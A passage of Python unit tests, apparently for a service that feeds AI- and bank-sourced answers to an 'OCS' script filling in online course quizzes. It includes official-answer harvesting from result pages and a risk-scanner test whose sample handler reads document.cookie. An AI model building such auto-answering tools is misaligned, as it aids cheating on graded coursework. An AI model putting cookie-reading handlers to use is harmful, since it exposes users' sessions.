                      "answer": "错误", "source": "ai", "status": "pending"})
            preview = bank.dedupe(dry_run=True)
            self.assertEqual(preview["conflict_count"], 1)
            self.assertTrue(all(i["status"] == "adopted" or i["status"] == "pending" for i in bank.all()))
            bank.dedupe(dry_run=False)
            statuses = [i["status"] for i in bank.all()]
            self.assertEqual(statuses.count("pending"), 2)
            self.assertTrue(all(i["conflict"] for i in bank.all()))

    def test_judge_option_synonyms_match(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "judge", "title": "地球是圆的", "options": ["对", "错"],
                      "answer": "对", "source": "official", "status": "adopted"})
            hit = bank.match("judge", "地球是圆的", ["正确", "错误"])
            self.assertIsNotNone(hit)
            self.assertEqual(hit["answer"], "正确")

    def test_bank_search_by_title(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "single", "title": "以下哪个是中国的首都？", "options": ["北京", "上海"], "answer": "A"})
            bank.add({"type": "judge", "title": "地球是圆的", "options": ["对", "错"], "answer": "正确"})
            hits = bank.search("中国的首都是哪里", 5)
            self.assertTrue(hits)
            self.assertEqual(hits[0]["answer"], "A")
            self.assertEqual(bank.search("", 5), [])

    def test_bank_dedupe(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "judge", "title": "地球是圆的", "options": ["对", "错"],
                      "answer": "正确", "subject": "默认", "source": "ai", "status": "pending"})
            bank.add({"type": "judge", "title": "地球是圆的", "options": ["对", "错"],
                      "answer": "正确", "subject": "地理", "source": "calibrated", "status": "adopted"})
            bank.add({"type": "judge", "title": "地球是圆的", "options": ["对", "错"],
                      "answer": "错误", "subject": "地理", "source": "official", "status": "adopted"})
            preview = bank.dedupe(dry_run=True)
            self.assertEqual(preview["groups"], 1)
            self.assertEqual(preview["removed"], 2)
            self.assertEqual(bank.count(), 3)
            bank.dedupe(dry_run=False)
            self.assertEqual(bank.count(), 1)
            item = bank.all()[0]
            self.assertEqual(item["answer"], "错误")
            self.assertEqual(item["source"], "official")
            self.assertEqual(item["subject"], "地理")
            self.assertIn("正确", item["wrong_answers"])

    def test_bank_dedupe_keeps_different_images_apart(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "single", "title": "看图选择", "options": ["A", "B"],
                      "answer": "A", "image_hash": "h1"})
            bank.add({"type": "single", "title": "看图选择", "options": ["A", "B"],
                      "answer": "A", "image_hash": "h2"})
            bank.dedupe(dry_run=False)
            self.assertEqual(bank.count(), 2)

    def test_bank_crud(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            item = bank.add({"type": "single", "title": "首都是", "options": ["北京", "上海"], "answer": "A"})
            self.assertEqual(bank.count(), 1)
            self.assertEqual(bank.match("single", "首都是", ["北京", "上海"])["answer"], "A")
            self.assertEqual(bank.match("single", "首都是", ["上海", "北京"])["answer"], "B")
            bank.update(item["id"], {"answer": "B"})
            self.assertEqual(bank.match("single", "首都是", ["北京", "上海"])["answer"], "B")
            self.assertTrue(bank.delete(item["id"]))
            self.assertEqual(bank.count(), 0)

    def test_answer_translated_when_option_order_differs(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "single", "title": "选项乱序题", "options": ["甲", "乙", "丙"],
                      "answer": "C", "source": "official", "status": "adopted"})
            hit = bank.match("single", "选项乱序题", ["丙", "甲", "乙"], "默认")
            self.assertIsNotNone(hit)
            self.assertEqual(hit["answer"], "A")
            other = bank.find_official("single", "选项乱序题", ["乙", "丙", "甲"])
            self.assertIsNotNone(other)
            self.assertEqual(other["answer"], "B")

    def test_similar_match_and_subject(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "single", "title": "以下哪个是中国的首都？", "options": ["北京", "上海"],
                      "answer": "A", "subject": "地理"})
            hit = bank.match("single", "以下哪个是中国的首都呢？", ["上海", "北京"], "地理")
            self.assertIsNotNone(hit)
            self.assertEqual(hit["answer"], "B")
            self.assertEqual(hit["_match"], "similar")
            self.assertIsNone(bank.match("single", "以下哪个是中国的首都呢？", ["上海", "北京"], "历史"))
            self.assertIsNone(bank.match("single", "以下哪个是中国的首都呢？", ["北京", "广州"], "地理"))

    def test_low_similarity_not_matched(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "single", "title": "以下哪个是中国的首都？", "options": ["北京", "上海"], "answer": "A"})
            self.assertIsNone(bank.match("single", "完全不一样的题目内容", ["北京", "上海"]))

    def test_record_attempt_auto_adopt_and_conflict(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            item = bank.add({"type": "single", "title": "题", "options": ["a", "b"], "answer": "A",
                             "source": "ai", "status": "pending"})
            self.assertEqual(bank.record_attempt(item["id"], "A", "m1")["agree"], 1)
            self.assertEqual(bank.record_attempt(item["id"], "A", "m2")["status"], "adopted")
            after = bank.record_attempt(item["id"], "B", "m3")
            self.assertEqual(after["answer"], "B")
            self.assertTrue(after["conflict"])
            self.assertEqual(after["history"][0]["answer"], "A")
            self.assertEqual(after["agree"], 0)

    def test_record_attempt_demotes_adopted_on_conflict(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            item = bank.add({"type": "single", "title": "已采纳冲突题", "options": ["a", "b"],
                             "answer": "A", "source": "ai", "status": "adopted"})
            after = bank.record_attempt(item["id"], "B")
            self.assertEqual(after["answer"], "B")
            self.assertEqual(after["status"], "pending")
            self.assertTrue(after["conflict"])

    def test_record_attempt_does_not_touch_official(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            official = bank.add({"type": "judge", "title": "官方保护题", "options": ["对", "错"],
                                 "answer": "正确", "source": "official", "status": "adopted"})
            after = bank.record_attempt(official["id"], "错误")
            self.assertEqual(after["answer"], "正确")
            self.assertFalse(after["conflict"])
            self.assertEqual(after["status"], "adopted")

    def test_upsert_calibrated_keeps_official(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            official = bank.add({"type": "judge", "title": "官方不被校准覆盖", "options": ["对", "错"],
                                 "answer": "正确", "source": "official", "status": "adopted"})
            after = bank.upsert_calibrated("judge", "官方不被校准覆盖", ["对", "错"], "错误",
                                           None, adopted=True, source="calibrated")
            self.assertEqual(after["id"], official["id"])
            self.assertEqual(after["answer"], "正确")
            self.assertEqual(after["source"], "official")

    def test_manual_update_records_history(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            item = bank.add({"type": "single", "title": "题", "options": ["a", "b"], "answer": "A",
                             "source": "ai", "status": "pending"})
            updated = bank.update(item["id"], {"answer": "B"})
            self.assertEqual(updated["answer"], "B")
            self.assertEqual(updated["status"], "adopted")
            self.assertTrue(updated["conflict"])
            self.assertEqual(updated["history"][0]["answer"], "A")


    def test_mark_wrong_blocks_repeat(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            item = bank.add({"type": "single", "title": "错题", "options": ["a", "b"], "answer": "A",
                             "source": "ai", "status": "adopted"})
            marked = bank.mark_wrong(item["id"])
            self.assertEqual(marked["answer"], "")
            self.assertEqual(marked["status"], "pending")
            self.assertIn("A", marked["wrong_answers"])
            bank.record_attempt(item["id"], "A", "m")
            bank.record_attempt(item["id"], "A", "m")
            row = [i for i in bank.all() if i["id"] == item["id"]][0]
            self.assertEqual(row["status"], "pending")
            self.assertEqual(row["agree"], 0)
            bank.record_attempt(item["id"], "B", "m")
            bank.record_attempt(item["id"], "B", "m")
            row = [i for i in bank.all() if i["id"] == item["id"]][0]
            self.assertEqual(row["status"], "pending")
            bank.record_attempt(item["id"], "B", "m")
            row = [i for i in bank.all() if i["id"] == item["id"]][0]
            self.assertEqual(row["status"], "adopted")


    def test_image_hash_match(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "single", "title": "看图题", "options": ["甲", "乙"], "answer": "A",
                      "image_hash": "hash1"})
            hit = bank.match("single", "完全不同的标题", ["乙", "甲"], None, "hash1")
            self.assertIsNotNone(hit)
            self.assertEqual(hit["answer"], "B")
            self.assertIsNone(bank.match("single", "完全不同的标题", ["乙", "甲"], None, "hash2"))
            self.assertIsNone(bank.match("single", "看图题", ["甲", "乙"], None, None))


    def test_judge_symbol_options_match_official(self):
        """OCS 结果页的判断题选项是 ✓/✗ 图标，官方题库存的是 对/错，两者要能对上。"""
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "judge", "title": "图标判断题", "options": ["对", "错"],
                      "answer": "错误", "source": "official", "status": "adopted"})
            hit = bank.find_official("judge", "图标判断题", ["✗", "✓"])
            self.assertIsNotNone(hit)
            self.assertEqual(hit["answer"], "错误")
            self.assertEqual(bank.find_exact("judge", "图标判断题", ["✗", "✓"])["answer"], "错误")
            matched = bank.match("judge", "图标判断题", ["✗", "✓"])
            self.assertIsNotNone(matched)
            self.assertEqual(matched["answer"], "错误")

    def test_completion_placeholder_option_matches_official(self):
        """OCS 把「请输入答案」当填空题选项传上来，官方题库存的是空选项列表。"""
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "completion", "title": "占位填空题", "options": [],
                      "answer": "6", "source": "official", "status": "adopted"})
            hit = bank.find_official("completion", "占位填空题", ["请输入答案"])
            self.assertIsNotNone(hit)
            self.assertEqual(hit["answer"], "6")
            self.assertEqual(bank.find_exact("completion", "占位填空题", ["请输入答案"])["answer"], "6")
            matched = bank.match("completion", "占位填空题", ["请输入答案"])
            self.assertIsNotNone(matched)
            self.assertEqual(matched["answer"], "6")
            # 单选题的同名选项是真实内容，不能被当成占位符剔除
            bank.add({"type": "single", "title": "占位单选题", "options": ["请输入答案", "甲"],
                      "answer": "A", "source": "official", "status": "adopted"})
            self.assertIsNone(bank.find_exact("single", "占位单选题", ["请输入答案"]))

    def test_completion_blank_answer_placeholder_matches_official(self):
        """OCS 交白卷时传的「你没有填写答案」也是占位符，要和「请输入答案」一样剔除。"""
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "completion", "title": "白卷填空题", "options": [],
                      "answer": "9", "source": "official", "status": "adopted"})
            hit = bank.find_official("completion", "白卷填空题", ["你没有填写答案"])
            self.assertIsNotNone(hit)
            self.assertEqual(hit["answer"], "9")
            self.assertEqual(bank.find_exact("completion", "白卷填空题", ["你没有填写答案"])["answer"], "9")
            matched = bank.match("completion", "白卷填空题", ["你没有填写答案"])
            self.assertIsNotNone(matched)
            self.assertEqual(matched["answer"], "9")

    def test_find_by_position_uses_bank_entry(self):
        """选项只剩字母时，按位置取题库里的答案（OCS 的选项是图片）。"""
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({
                "type": "single",
                "title": "选项是图片的题",
                "options": ["http://x/o1.png", "http://x/o2.png",
                            "http://x/o3.png", "http://x/o4.png"],
                "answer": "C", "source": "official", "status": "adopted",
            })
            hit = bank.find_by_position("single", "选项是图片的题", ["A", "B", "C", "D"])
            self.assertIsNotNone(hit)
            self.assertEqual(hit["answer"], "C")
            self.assertEqual(hit["_match"], "position")
            # 选项不是纯字母时不走这条路径
            self.assertIsNone(bank.find_by_position("single", "选项是图片的题", ["甲", "乙"]))
            # 选项个数对不上不能按位置蒙
            self.assertIsNone(bank.find_by_position("single", "选项是图片的题", ["A", "B"]))

    def test_latex_question_matches_image_bank_entry(self):
        """同一道题：答题页是 LaTeX 文本 + 纯字母选项，题库存的是图片 URL 形态。"""
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            image_a = "http://x/aaa.png"
            image_b = "http://x/bbb.png"
            bank.set_image_text({image_a: r"\(A, B\)", image_b: r"\(A \cup B =\)"})
            bank.add({
                "type": "single",
                "title": f"设有事件 {image_a} ，则 {image_b} （ ）",
                "options": ["http://x/o1.png", "http://x/o2.png",
                            "http://x/o3.png", "http://x/o4.png"],
                "answer": "C", "source": "official", "status": "adopted",
            })
            latex_title = "设有事件 $A, B$，则 $\\overline{A \\cup B} = $\\（ ）"
            hit = bank.find_official("single", latex_title, ["A", "B", "C", "D"])
            self.assertIsNotNone(hit)
            self.assertEqual(hit["answer"], "C")
            # 只有图不同、题干其余部分相同的两道题，不能被并成一道
            bank.add({
                "type": "single",
                "title": f"设有事件 {image_a} ，则 http://x/ccc.png （ ）",
                "options": ["http://x/o1.png", "http://x/o2.png",
                            "http://x/o3.png", "http://x/o4.png"],
                "answer": "A", "source": "official", "status": "adopted",
            })
            still = bank.find_official("single", latex_title, ["A", "B", "C", "D"])
            self.assertIsNotNone(still)
            self.assertEqual(still["answer"], "C")

    def test_canon_fallback_requires_matching_options(self):
        """规范题干相同但选项不同，不能蹭到别的题的答案。"""
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "single", "title": "设有事件 $A, B$，则（ ）",
                      "options": ["甲", "乙", "丙", "丁"], "answer": "A",
                      "source": "official", "status": "adopted"})
            self.assertIsNone(bank.find_official("single", "设有事件 $A, B$，则（ ）",
                                                 ["甲", "乙"]))
            self.assertIsNone(bank.find_official("single", "设有事件 $A, B$，则（ ）",
                                                 ["A", "B", "C", "D"]))

    def test_broken_options_are_not_served_as_official(self):
        """选项坏掉的记录（重复/空项）不能当权威答案返回。

        历史脏数据：结果页解析器把对错图标当选项内容，判断题存成 ['正确','正确']，
        按内容映射答案时会映射到第一个，把正确答案翻反。
        """
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "judge", "title": "图标污染题", "options": ["正确", "正确"],
                      "answer": "正确", "source": "official", "status": "adopted"})
            # 选项坏掉的记录不能被返回
            self.assertIsNone(bank.find_official("judge", "图标污染题", ["对", "错"]))
            # 同题另一条选项正常的记录仍可命中
            bank.add({"type": "judge", "title": "图标污染题", "options": ["错误", "正确"],
                      "answer": "正确", "source": "official", "status": "adopted"})
            hit = bank.find_official("judge", "图标污染题", ["对", "错"])
            self.assertIsNotNone(hit)
            self.assertEqual(hit["answer"], "正确")
            # 选项含空串的单选题同样不能作为权威答案
            bank.add({"type": "single", "title": "空选项题", "options": ["", "", "", ""],
                      "answer": "C", "source": "official", "status": "adopted"})
            self.assertIsNone(bank.find_official("single", "空选项题", ["A", "B", "C", "D"]))

    def test_upsert_calibrated(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            item = bank.add({"type": "single", "title": "校准题", "options": ["甲", "乙"],
                             "answer": "A", "source": "ai", "status": "pending"})
            updated = bank.upsert_calibrated("single", "校准题", ["乙", "甲"], "B", None, adopted=True)
            self.assertEqual(updated["id"], item["id"])
            self.assertEqual(updated["answer"], "B")
            self.assertEqual(updated["status"], "adopted")
            self.assertEqual(updated["source"], "calibrated")
            self.assertEqual(updated["history"][0]["answer"], "A")
            conflict = bank.upsert_calibrated("single", "新题", ["甲", "乙"], "A", None, adopted=False, alt="C")
            self.assertEqual(conflict["status"], "pending")
            self.assertTrue(conflict["conflict"])
            self.assertEqual(conflict["history"][0]["answer"], "C")

    def test_simhash_similar_title_small_distance(self):
        left = simhash64("线性方程组的系数行列式不为零时，方程组有唯一解")
        right = simhash64("线性方程组的系数行列式不为零时, 方程组有唯一解")
        other = simhash64("随机变量的数学期望具有线性性质")
        self.assertLessEqual(hamming(left, right), 8)
        self.assertGreater(hamming(left, other), 8)

    def test_near_dedupe_merges_typo_variant(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "judge", "title": "实对称矩阵一定可以正交对角化。",
                      "options": ["对", "错"], "answer": "正确", "subject": "线性代数", "source": "official"})
            bank.add({"type": "judge", "title": "实对称矩阵一定可以正交对角化",
                      "options": ["对", "错"], "answer": "正确", "subject": "线性代数", "source": "ai"})
            preview = bank.dedupe_near(3, dry_run=True)
            self.assertEqual(preview["groups"], 1)
            self.assertEqual(bank.count("线性代数"), 2)
            result = bank.dedupe_near(3, dry_run=False)
            self.assertEqual(result["removed"], 1)
            items = bank.all("线性代数")
            self.assertEqual(len(items), 1)
            self.assertEqual(items[0]["source"], "official")

    def test_near_dedupe_keeps_different_questions(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.add({"type": "judge", "title": "行列式为零则方程组有非零解。",
                      "options": ["对", "错"], "answer": "正确"})
            bank.add({"type": "judge", "title": "方程组有非零解则行列式为零。",
                      "options": ["对", "错"], "answer": "正确"})
            result = bank.dedupe_near(3, dry_run=False)
            self.assertEqual(result["removed"], 0)
            self.assertEqual(bank.count(), 2)


class ApiTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        main.store = ProviderStore(os.path.join(self.tmp.name, "providers.json"))
        main.cache = AnswerCache(os.path.join(self.tmp.name, "answers.db"), 168)
        main.bank = Bank(os.path.join(self.tmp.name, "bank.json"))
        main._attach_bank_cache_invalidation(main.bank)
        main.subject_rules = main.SubjectRules(os.path.join(self.tmp.name, "subjects.json"))
        main.settings = main.Settings(os.path.join(self.tmp.name, "settings.json"))
        main.progress = main.ProgressStore(os.path.join(self.tmp.name, "progress.json"))
        main.stats = main.Stats(os.path.join(self.tmp.name, "stats.json"))
        main.failures = main.FailureLog(os.path.join(self.tmp.name, "failures.json"))
        # 其余全局单例也指到临时目录，避免用例互相污染或写真实数据
        main.deadlines = main.DeadlineStore(os.path.join(self.tmp.name, "deadlines.json"))
        main.scene_state = main.SceneState(os.path.join(self.tmp.name, "scene.json"))
        main.unit_sessions = main.UnitSessions(os.path.join(self.tmp.name, "unit_sessions.json"))
        main.probes = main.ProbeStore(os.path.join(self.tmp.name, "probes.json"))
        main.vote_queue = main.VoteQueue(os.path.join(self.tmp.name, "vote_queue.json"))
        main.notify_cfg = main.NotifyConfig(os.path.join(self.tmp.name, "notify.json"))
        main.ops_log = main.OpsLog(os.path.join(self.tmp.name, "ops.json"))
        main.quiz_status = main.QuizStatus(os.path.join(self.tmp.name, "quiz_status.json"))
        main.inspector = main.inspector_mod.Inspector(os.path.join(self.tmp.name, "inspections.json"))
        main.image_text = main.ImageTextStore(os.path.join(self.tmp.name, "image_text.json"))
        main.image_assets = main.ImageAssetStore(os.path.join(self.tmp.name, "image_assets"))
        main.answer_memory = main.AnswerMemory(os.path.join(self.tmp.name, "answer_memory.db"))
        main.option_snapshots = main.OptionSnapshots(
            os.path.join(self.tmp.name, "option_snapshots.json"))
        main.feedback_feed = main.FeedbackFeed(
            os.path.join(self.tmp.name, "snapshots"),
            os.path.join(self.tmp.name, "feedback_feed.json"))
        main.web_search = main.WebSearch(
            os.path.join(self.tmp.name, "web_cache.db"), engine="bing"
        )
        main.http_log = main.HttpLog(os.path.join(self.tmp.name, "http_log.db"))
        main.semantic_store = main.SemanticStore(
            os.path.join(self.tmp.name, "no-model"), os.path.join(self.tmp.name, "semantic.db")
        )
        main.bank.set_semantic(main.semantic_store)
        main._warm_started = True
        main._recent_failures.clear()
        main.store.add(
            {
                "name": "主 AI",
                "base_url": "https://example.com/v1",
                "api_key": "sk-test-1234",
                "model": "test-model",
            }
        )
        self.client = TestClient(main.app)

    def tearDown(self):
        main.cache.close()
        try:
            main.answer_memory.close()
        except Exception:  # noqa: BLE001
            pass
        try:
            main.web_search.close()
        except Exception:  # noqa: BLE001
            pass
        try:
            main.bank.close()
        except Exception:  # noqa: BLE001
            pass
        try:
            main.http_log.close()
        except Exception:  # noqa: BLE001
            pass
        self.tmp.cleanup()

    def test_health(self):
        data = self.client.get("/health").json()
        self.assertEqual(data["status"], "ok")
        self.assertEqual(data["providers"], 1)

    def test_memory_recall_after_official_feedback(self):
        """官方回流判错后，同一道题应直接复用确认答案，不再问模型。"""
        title = "记忆召回题"
        options = ["甲", "乙", "丙"]
        item = {"id": "memory-test-1", "type": "single", "title": title,
                "options": options, "answer": "A", "subject": "数学", "via": "主 AI"}
        main.answer_memory.record(
            qtype="single", title=title, options=options, answer="A",
            source="ai", provider="主 AI", strategy="single", subject="数学",
        )
        # 生产路径 apply_feedback 会同时触发 on_verdict（正确率统计）和
        # on_official（写答题记忆）；这里两个回调都要模拟。
        main._verdict_sink(item, "B", False, "quick")
        main._official_memory_sink(item, "B", "feedback", "quick")

        with mock.patch.object(main, "_ask_limited",
                               mock.AsyncMock(side_effect=AssertionError("不应问模型"))):
            data = self.client.post("/query", json={
                "title": title, "type": "single", "options": options,
                "subject": "数学",
            }).json()
        self.assertEqual(data["code"], 0)
        self.assertEqual(data["data"]["answer"], "B")
        self.assertEqual(data["data"]["source"], "memory")
        self.assertEqual(data["data"]["match"], "memory-exact")
        self.assertIsNotNone(data["data"]["memory"]["qkey"])

        memory_stats = self.client.get("/api/memory/stats").json()
        self.assertGreaterEqual(memory_stats["episodes"]["wrong"], 1)
        self.assertGreaterEqual(memory_stats["memories"]["trusted"], 1)

    def _recent_feedback_fixture(self):
        """造一份「单选错答」的结果页快照。"""
        snapshot_dir = os.path.join(self.tmp.name, "snapshots")
        os.makedirs(snapshot_dir, exist_ok=True)
        html = (
            '<div class="m-choiceQuestion u-questionItem analysisMode">'
            '<div class="j-richTxt">测试错题：下列说法正确的是</div>'
            '<div class="qaMark"></div><ul>'
            '<li><div class="optionPos">A.</div><div class="optionCnt">甲</div></li>'
            '<li><div class="optionPos">B.</div><div class="optionCnt">乙</div></li>'
            '<li class="checked"><div class="optionPos">C.</div>'
            '<div class="optionCnt">丙</div><input type="radio" checked></li>'
            '<li><div class="optionPos">D.</div><div class="optionCnt">丁</div></li>'
            '</ul>'
            '<div class="analysisInfo answrong"><div>'
            '<span class="tt1">正确答案：</span><span class="tt2">B</span>'
            '<span class="tt3">你错选为C</span></div></div>'
            '</div>'
        )
        name = "20261110-120000-000.html"
        path = os.path.join(snapshot_dir, name)
        with open(path, "w", encoding="utf-8") as fp:
            fp.write(html)
        with open(path + ".json", "w", encoding="utf-8") as fp:
            json.dump({"at": time.time()}, fp)
        main.feedback_feed = main.FeedbackFeed(
            snapshot_dir, os.path.join(self.tmp.name, "feedback_feed.json"))
        return "测试错题：下列说法正确的是", ["甲", "乙", "丙", "丁"]

    def test_recent_feedback_auto_fix_writes_bank_and_memory(self):
        """实时错题面板：页面官方答案一键写进题库与记忆，并刷新同步状态。"""
        title, options = self._recent_feedback_fixture()
        data = self.client.get("/api/bank/recent-feedback?limit=10").json()
        self.assertEqual(len(data["items"]), 1)
        entry = data["items"][0]
        self.assertEqual(entry["answer"], "B")
        self.assertEqual(entry["selected"], ["C"])
        self.assertFalse(entry["bank"]["synced"])
        self.assertFalse(entry["memory"]["synced"])
        self.assertTrue(entry["fixable"])

        result = self.client.post(
            "/api/bank/recent-feedback/apply",
            json={"items": [entry], "source": "official"},
        ).json()
        self.assertEqual(result["applied"], 1)
        row = main.bank.find_exact("single", title, options)
        self.assertEqual(row["answer"], "B")
        self.assertEqual(row["source"], "official")
        state = main.answer_memory.truth_state(
            qtype="single", title=title, options=options, answer="B")
        self.assertTrue(state["synced"])

        data = self.client.get("/api/bank/recent-feedback?limit=10").json()
        self.assertTrue(data["items"][0]["bank"]["synced"])
        self.assertTrue(data["items"][0]["memory"]["synced"])
        self.assertFalse(data["items"][0]["fixable"])

    def test_recent_feedback_manual_fix_syncs_memory(self):
        """手动修改答案后必须同步答题记忆（不能只改题库）。"""
        title, options = self._recent_feedback_fixture()
        entry = self.client.get("/api/bank/recent-feedback?limit=10").json()["items"][0]
        payload = {
            "qtype": entry["qtype"], "title": entry["title"],
            "options": entry["options"], "answer": "D",
        }
        result = self.client.post(
            "/api/bank/recent-feedback/apply",
            json={"items": [payload], "source": "manual"},
        ).json()
        self.assertEqual(result["applied"], 1)
        row = main.bank.find_exact("single", title, options)
        self.assertEqual(row["answer"], "D")
        self.assertEqual(row["source"], "manual")
        state = main.answer_memory.truth_state(
            qtype="single", title=title, options=options, answer="D")
        self.assertTrue(state["synced"])
        self.assertEqual(state["source"], "manual")

    def test_recent_feedback_manual_write_failure_is_reported(self):
        """手动修改时题库写入失败不能报成功，否则面板会显示「已修改」但库没变。"""
        title, options = self._recent_feedback_fixture()
        main.bank.upsert_calibrated(
            "single", title, options, "A", "默认", adopted=True, source="ai")
        payload = {"qtype": "single", "title": title,
                   "options": options, "answer": "D"}
        with mock.patch.object(main.bank, "update", return_value=None):
            result = self.client.post(
                "/api/bank/recent-feedback/apply",
                json={"items": [payload], "source": "manual"},
            ).json()
        self.assertEqual(result["applied"], 0)
        self.assertEqual(result["failed"], 1)
        self.assertIn("写入失败", result["results"][0]["error"])

    def test_recent_feedback_official_skip_is_reported(self):
        """自动修正没写库（apply_feedback 返回 skip）时不能报成功。"""
        title, options = self._recent_feedback_fixture()
        payload = {"qtype": "single", "title": title,
                   "options": options, "answer": "B"}
        skipped = {"applied": 0, "details": [{"action": "skip"}]}
        with mock.patch.object(main, "apply_feedback", return_value=skipped):
            result = self.client.post(
                "/api/bank/recent-feedback/apply",
                json={"items": [payload], "source": "official"},
            ).json()
        self.assertEqual(result["applied"], 0)
        self.assertEqual(result["failed"], 1)
        self.assertIn("未写入题库", result["results"][0]["error"])

    def test_memory_hint_is_added_to_prompt(self):
        """相似题的历史错答/确认答案要进入提示词，但不能当成当前题的标准答案。"""
        memory_title = ("设随机变量X的分布列为P(X=k)=1/4, k=1,2,3,4，"
                        "则E(X)=?")
        near_title = ("设随机变量X的分布列为P(X=k)=1/4, k=1,2,3,4，"
                      "则E(X)等于?")
        options = ["1", "2", "2.5", "3"]
        main.answer_memory.record(
            qtype="single", title=memory_title, options=options, answer="A",
            source="ai", provider="主 AI", strategy="single", subject="概率论",
        )
        main.answer_memory.record_outcome(
            qtype="single", title=memory_title, options=options,
            official_answer="C", ok=False, source="feedback", subject="概率论",
        )
        captured = {}

        async def fake(providers, qtype, options, messages, used_images, cross):
            captured["messages"] = messages
            return "C", providers[0], 1, [], {"confidence": 1.0, "cross": None}

        with mock.patch.object(main, "_ask_limited", fake):
            data = self.client.post("/query", json={
                "title": near_title, "type": "single", "options": options,
                "subject": "概率论",
            }).json()
        self.assertEqual(data["code"], 0)
        self.assertEqual(data["data"]["answer"], "C")
        self.assertTrue(data["data"]["memory_hint"])
        prompt = json.dumps(captured["messages"], ensure_ascii=False)
        self.assertIn("记忆提示", prompt)
        self.assertIn("曾判错", prompt)
        self.assertIn("已确认", prompt)

    def test_web_learning_injects_sources(self):
        """题库/记忆都没命中时，联网检索结果要进提示词，来源回给脚本。"""
        title = "联网检索测试题：矩阵的秩是多少"
        options = ["1", "2", "3", "4"]
        main.settings.update({"web_learn": True})
        captured = {}

        async def fake_search(*args, **kwargs):
            captured["query"] = args[0] if args else kwargs.get("query")
            return [{"title": "公开题库", "url": "https://example.com/q",
                     "content": "这道题的答案是 B"}]

        async def fake_ask(providers, qtype, options_, messages, used_images, cross):
            captured["messages"] = messages
            return "B", providers[0], 1, [], {"confidence": 1.0, "cross": None}

        with mock.patch.object(main.web_search, "search",
                               mock.AsyncMock(side_effect=fake_search)), \
                mock.patch.object(main, "_ask_limited", fake_ask):
            data = self.client.post("/query", json={
                "title": title, "type": "single", "options": options,
            }).json()

        self.assertEqual(data["code"], 0)
        self.assertTrue(data["data"]["web_used"])
        self.assertEqual(data["data"]["web_sources"][0]["url"],
                         "https://example.com/q")
        prompt = json.dumps(captured["messages"], ensure_ascii=False)
        self.assertIn("[联网检索资料]", prompt)
        self.assertIn("https://example.com/q", prompt)
        self.assertIn("矩阵的秩", captured["query"])

    def test_memory_forget_requires_explicit_all(self):
        self.assertEqual(
            self.client.post("/api/memory/forget", json={}).status_code, 400)
        data = self.client.post("/api/memory/forget", json={"all": True}).json()
        self.assertTrue(data["ok"])
        self.assertTrue(data["all"])

    def test_backup_and_restore_answer_memory(self):
        title = "备份记忆题"
        options = ["甲", "乙"]
        main.answer_memory.record(
            qtype="single", title=title, options=options, answer="A",
            source="ai", provider="主 AI", strategy="single",
        )
        before = main.answer_memory.count()
        resp = self.client.get("/api/backup")
        self.assertEqual(resp.status_code, 200)
        names = zipfile.ZipFile(io.BytesIO(resp.content)).namelist()
        self.assertIn("answer_memory.db", names)

        main.answer_memory.record(
            qtype="single", title="备份后新增记忆题", options=options, answer="B",
            source="ai", provider="主 AI", strategy="single",
        )
        self.assertEqual(main.answer_memory.count(), before + 1)
        restored = self.client.post(
            "/api/restore", files={"file": ("b.zip", resp.content, "application/zip")})
        self.assertEqual(restored.status_code, 200)
        self.assertEqual(main.answer_memory.count(), before)

    def test_ocs_config_risk_scan(self):
        """题库配置的 handler 会在页面上执行，导入前要扫一遍风险。"""
        from app.config_risk import scan_config_risks
        # 我们自己生成的 v2 handler 不该被报
        ours = "return (res)=>res.code !== 0 ? [] : [[res.data.question, res.data.answer, res.data]]"
        self.assertEqual(scan_config_risks({"handler": ours}), [])
        # 偷 cookie / 外发数据 / 读 localStorage 要被报出来
        risky = scan_config_risks({"handler": "return (res)=>{ document.cookie; return [] }"})
        self.assertTrue(any(r["id"] == "cookie" for r in risky))
